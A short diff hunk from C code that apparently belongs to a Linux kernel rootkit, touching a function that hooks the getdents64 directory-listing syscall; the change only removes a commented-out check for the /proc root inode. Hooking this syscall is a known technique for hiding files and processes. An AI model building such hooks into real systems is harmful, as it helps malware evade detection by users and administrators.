@@ -58,9 +58,7 @@ asmlinkage long sys_getdents64_hook (const struct pt_regs *pt_regs)
             return ret;
         }
     
-   /* if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
-        proc = 1;*/
-
+   
     while (i < ret)
     {
         /*
